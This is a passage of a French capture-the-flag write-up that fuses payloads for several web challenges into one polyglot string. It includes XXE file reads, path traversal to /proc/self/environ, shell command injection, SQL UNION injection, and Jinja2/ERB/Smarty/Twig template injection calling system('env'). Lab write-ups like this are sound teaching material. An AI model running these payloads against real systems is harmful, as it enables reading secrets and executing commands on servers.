+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE y [&lt;!ENTITY x SYSTEM &#39;file:///dev/shm/flag.txt&#39;&gt;</span>]&gt;<span class="nt">&lt;a&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/a&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>La payload est la plus simple, et peut-être la plus connue, elle nous permet de définir un document <code>y</code> contenant une entité <code>x</code>. On assigne à cette entité une valeur externe, étant ici le fichier contenant le flag.
+On défini ensuite un noeud dans lequel affiché notre entité, ici <code>&lt;a&gt;&amp;x;&lt;/a&gt;</code></p>
+<p>Une attaque connue et &ldquo;simple&rdquo; mais qui nous posera problème plus tard&hellip;</p>
+<h2 class="heading-element" id="path-traversal"><span>Path Traversal</span>
+  <a href="#path-traversal" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Pour finir la liste des challenges, nous avons une Path Traversal ! Celle-ci doit être effectuée à travers un code PHP :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$PAYLOAD</span> <span class="o">=</span> <span class="nx">getenv</span><span class="p">(</span><span class="s1">&#39;PAYLOAD&#39;</span><span class="p">)</span> <span class="o">?:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">print</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$PAYLOAD</span><span class="p">));</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Il nous faut afficher le contenu de la variable d&rsquo;environnement <code>FLAG</code>.
+De plus, si ça n&rsquo;est pas visible dans le code, notre payload est préfixée par <code>./</code>.</p>
+<p>Seulement, un problème se pose.
+On doit lire une variable d&rsquo;environnement, mais nous sommes clairement limité à la lecture de fichiers. Comment faire ?</p>
+<p>On va utilisé les fichiers de processus !</p>
+<p>Dans Linux, tout est fichier, il est donc normal que les processus soient soient représentés par des fichiers. Et les processus contiennent leurs variables d&rsquo;environnement.
+Pour accéder au processus courant, il faut aller dans le dossier <code>/proc/self/</code> contenant d&rsquo;autre dossiers et fichiers. L&rsquo;un d&rsquo;eux est notre graal : <code>/proc/self/environ</code></p>
+<p>On se rend rapidement compte que nous ne sommes pas à la racine du serveur, mais il nous suffit de revenir en arrière avec <code>..</code> pour ensuite accéder à notre fichier</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">../proc/self/environ</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Et nous avons résolu de manière indépendante les 13 challenges. Quel délivrance !</p>
+<h2 class="heading-element" id="créer-une-payload-commune"><span>Créer une payload commune</span>
+  <a href="#cr%c3%a9er-une-payload-commune" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Maintenant que nous avons compris toutes les vulnérabilités, il nous faut &ldquo;fusionner&rdquo; les payloads.
+Je ne pense pas qu&rsquo;il y ai de méthodologie parfaite pour cela, mais je pense tout de même avoir fait comme la majorité des gens : on essaie de les imbriquer 1 par 1, puis on corrige ce qui créé des erreurs.</p>
+<h2 class="heading-element" id="le-début-du-commencement"><span>Le début du commencement</span>
+  <a href="#le-d%c3%a9but-du-commencement" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Mon objectif étant de montrer ce que j&rsquo;ai fait durant ce challenge, l&rsquo;ordre des payloads ne sera pas forcément le plus intelligent. En effet, je n&rsquo;avais pas forcément regardé tous les challenge individuellement lorsque j&rsquo;ai commencé, j&rsquo;étais surtout curieux.
+Vous pourrez d&rsquo;ailleurs voir que certaines payload vont changer au fur et à mesure. Une idée bonne lorsque l&rsquo;on fait 5 vulnérabilités à la fois peut avoir des conséquences désastreuses pour implémenter la 12ème, et l&rsquo;on devra alors tout retravailler.</p>
+<p>Je suis parti du premier challenge que j&rsquo;ai réussi : <strong>l&rsquo;injection bash</strong>
+Puis j&rsquo;ai ajouté l&rsquo;une des attaques que je connaissais le mieux pour aller petit à petit vers ce qui me semblait plus compliquer à implémenter.</p>
+<h2 class="heading-element" id="la-ssti-jinja2"><span>La SSTI Jinja2</span>
+  <a href="#la-ssti-jinja2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Ma réflexion ici était la suivante :
+Jinja n&rsquo;interpretera pas du tout le bash, il est donc possible d&rsquo;allier facilement l&rsquo;un puis l&rsquo;autre, notamment avec les 2 payloads que j&rsquo;ai présenté plus tôt.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;;env;#{{lipsum.__globals__.os.environ.FLAG}}</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Ici aucune, entre autre grâce au commentaire.
+On peut passer à l&rsquo;étape suivante</p>
+<h2 class="heading-element" id="la-1ère-injection-sql"><span>La 1ère Injection SQL</span>
+  <a href="#la-1%c3%a8re-injection-sql" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>On continue avec ce que je connais le mieux et la première injection SQL.
+On va profiter du fait que les 2 payloads (notre actuelle et celle de la SQLi) commencent par une simple quote.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-SQL" data-lang="SQL"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT 1,2,flag FROM flag;env;#{{lipsum.__globals__.os.environ.FLAG}}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>On sait déjà que ce qui se trouve après le premier point virgule ne posera pas de problème pour la SQLi, cependant, ce qui peut surprendre c&rsquo;est le fait que le bash ne ressort pas une erreur.
+En fait c&rsquo;est dû au format de la commande injectée et à la syntaxe de la commande ping. Dans notre cas ping essaiera de résoudre le dernier &ldquo;mot&rdquo; de la commande, ici <code>flag</code> et puisqu&rsquo;il n&rsquo;y arrivera pas, il va créer une erreur.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ping -c <span class="m">1</span> <span class="s1">&#39;&#39;</span> UNION SELECT 1,2,flag FROM flag
+</span></span><span class="line"><span class="cl">ping: flag: Name or service not known</span></span></code></pre></td></tr></table>
+</div>
+</div><p>La syntaxe est donc valide. Et l&rsquo;erreur ne gêne pas pour la suite. L&rsquo;utilisation de point virgule <code>;</code> permet d&rsquo;enchaîner les commandes, avec ou sans erreur.</p>
+<h2 class="heading-element" id="et-la-2nde-injection-sql"><span>Et la 2nde Injection SQL</span>
+  <a href="#et-la-2nde-injection-sql" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Puisqu&rsquo;on a fait une injection SQL, autant faire la suivante.
+Ici, je vais profiter de la quote ajoutée pour la 1ère injection SQL. Je vais considérer toute ma payload actuelle comme une string et finir mon injection SQL ensuite.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT 1,2,flag FROM flag--;env;#{{lipsum.__globals__.os.environ.FLAG}}&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">flag</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Cela fonctionne car on peut comparer 2 valeurs ayant un type différent en SQL, notamment INTEGER &amp; TEXT.</p>
+<h2 class="heading-element" id="la-path-traversal"><span>La Path Traversal</span>
+  <a href="#la-path-traversal" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Si j&rsquo;avais été plus intelligent, j&rsquo;aurais du commencer par la <strong>Path Traversal</strong>.
+En effet, dû à son fonctionnement, cette payload doit être à la toute fin, car il n&rsquo;y a pas de moyen d&rsquo;ignorer les caractères qui viendront après notre chemin de fichier.
+Cela implique par contre qu&rsquo;il y aura beaucoup caractère au début de notre paylaod de path traversal.
+Heureusement pour nous, file_get_contents va normaliser/réduire le path. Si j&rsquo;ai un chemin <code>/a/b/../c</code>, il sera réduit avant d&rsquo;être lu et deviendra <code>/a/c</code> ne posant donc aucun problème, et ce même si le dossier <code>/a/b/</code> n&rsquo;existe pas.</p>
+<p>Pour notre path traversal, il suffira donc de rajouter un <code>/../</code> en plus et un autre pour chaque <code>/</code> contenu dans le reste de la payload. Vous verrez au fur et à mesure des payloads, l&rsquo;ajout de <code>/../</code>.</p>
+<p>Je vais juste prendre soin de commenter la fin de l&rsquo;injection SQL pour éviter les erreurs.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">&#39;</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span><span class="p">;</span><span class="n">env</span><span class="p">;</span><span class="err">#</span><span class="p">{{</span><span class="n">lipsum</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="n">FLAG</span><span class="p">}}</span><span class="err">&#39;</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span> <span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">self</span><span class="o">/</span><span class="n">environ</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 class="heading-element" id="erb"><span>ERB</span>
+  <a href="#erb" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>On profite pour l&rsquo;instant de n&rsquo;avoir aucune payload qui créé des erreurs avec une autre. Les SSTI de ERB vont bien dans ce sens avec leurs syntaxes qui ne provoquent pas d&rsquo;erreur chez les autre SSTI.
+Le tout étant de placer la payload au bon endroit : dans notre cas entre la 2ème SQLi et la path traversal.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">&#39;</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span><span class="p">;</span><span class="n">env</span><span class="p">;</span><span class="err">#</span><span class="p">{{</span><span class="n">lipsum</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="n">FLAG</span><span class="p">}}</span><span class="err">&#39;</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span> <span class="o">&lt;%=</span> <span class="n">ENV</span><span class="p">[</span><span class="err">&#39;</span><span class="n">FLAG</span><span class="err">&#39;</span><span class="p">]</span> <span class="o">%&gt;/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">self</span><span class="o">/</span><span class="n">environ</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 class="heading-element" id="smarty"><span>Smarty</span>
+  <a href="#smarty" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Et voilà notre premier problème.
+Smarty utilise 1 seule pair de brackets (<code>{}</code>) pour sa syntaxe, donc lorsqu&rsquo;il croise la syntaxe de Jinja2 cela va provoquer une erreur.</p>
+<p>Il nous faut trouver un moyen de ne pas interpréter Jinja2 lorsque nous somme en Smarty. Et pour ça on va utiliser un outil qu&rsquo;on a déjà utilisé dans d&rsquo;autre payloads : Les commentaires.</p>
+<p>Smarty intègre les commentaires avec sa propre syntaxe <code>{* COMMENTAIRE *}</code>, en mettant la payload Jinja2 entre commentaire smarty, on peut donc se protéger. Puis on rajoute la payload smarty à côté de l&rsquo;ERB.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">&#39;</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="p">;</span><span class="n">env</span><span class="p">;</span><span class="err">#</span><span class="p">{</span><span class="o">*</span><span class="p">{{</span><span class="n">lipsum</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="n">FLAG</span><span class="p">}}</span><span class="o">*</span><span class="p">}</span><span class="err">&#39;</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span> <span class="p">{</span><span class="nf">system</span><span class="p">(</span><span class="err">&#39;</span><span class="n">env</span><span class="err">&#39;</span><span class="p">)}</span> <span class="o">&lt;%=</span> <span class="n">ENV</span><span class="p">[</span><span class="err">&#39;</span><span class="n">FLAG</span><span class="err">&#39;</span><span class="p">]</span> <span class="o">%&gt;/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">self</span><span class="o">/</span><span class="n">environ</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 class="heading-element" id="twig"><span>Twig</span>
+  <a href="#twig" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Encore une difficulté, encore à cause de Jinja2.
+Twig et Jinja2 utilise une syntaxe similaire en quasi tout point (en tout cas pour notre challenge). On ne peut donc même pas utiliser l&rsquo;astuce des commentaires.</p>
+<p>Mon idée a alors été de profiter des propriété des langages (Jinja2 + Python &amp; Twig + PHP). Voici les propriété qui m&rsquo;ont semblé intéréssantes :</p>
+<ul>
+<li>PHP est sensible au type juggling a contrario de Python</li>
+<li>Jinja2 est sensibles aux erreurs (la moindre erreur fait planter tout l&rsquo;affichage) alors que Twig, non</li>
+<li>Jinja2, comme python, n&rsquo;interprète pas le code qu&rsquo;il n&rsquo;atteint pas. C&rsquo;est à dire <code>{% if 1==2 %}{{ 1/0 }}{% endif %}</code> ne provoquera pas d&rsquo;erreur, malgré la division par zéro, car il n&rsquo;entrera jamais dans la condition.</li>
+</ul>
+<p>Le tout est d&rsquo;empêcher jinja2 d&rsquo;interpéter le Twig plutôt que l&rsquo;inverse. Il faut donc trouver une condition qui soit vraie en PHP mais fausse en Python et pour ça le type juggling va nous être utile.</p>
+<p>La payload entre twig est Jinja2 va être la suivante :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="s1">&#39;1&#39;</span><span class="o">==</span><span class="mi">1</span> <span class="o">%</span><span class="p">}{{[</span><span class="s1">&#39;env&#39;</span><span class="p">]</span><span class="o">|</span><span class="nb">filter</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)}}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">FLAG</span><span class="p">}}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Super ça fonctionne entre les 2, cependant cela pose problème avec la 2ème SQLi.
+En effet, j&rsquo;ai rajouté des quote dans la payload juste avant la SQLi, et elle vont donc nous casser la payload SQL. Il faut donc déplacer cette payload Twig/Jinja avec les autre SSTI et penser à bien la remettre dans les commentaires Smarty.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">&#39;</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span><span class="p">;</span><span class="n">env</span><span class="p">;</span><span class="err">#&#39;</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span> <span class="p">{</span><span class="nf">system</span><span class="p">(</span><span class="err">&#39;</span><span class="n">env</span><span class="err">&#39;</span><span class="p">)}{</span><span class="o">*</span><span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="sc">&#39;1&#39;</span><span class="o">==</span><span class="mi">1</span> <span class="o">%</span><span class="p">}{{[</span><span class="err">&#39;</span><span class="n">env</span><span class="err">&#39;</span><span class="p">]</span><span class="o">|</span><span class="nf">filter</span><span class="p">(</span><span class="err">&#39;</span><span class="n">system</span><span class="err">&#39;</span><span class="p">)}}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}{{</span><span class="n">lipsum</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="n">FLAG</span><span class="p">}}</span><span class="o">*</span><span class="p">}</span> <span class="o">&lt;%=</span> <span class="n">ENV</span><span class="p">[</span><span class="err">&#39;</span><span class="n">FLAG</span><span class="err">&#39;</span><span class="p">]</span> <span class="o">%&gt;/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">self</span><span class="o">/</span><span class="n">environ</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Parfait cela fonctionne bien !</p>
+<h2 class="heading-element" id="xpath"><span>Xpath</span>
+  <a href="#xpath" class="heading-mark">
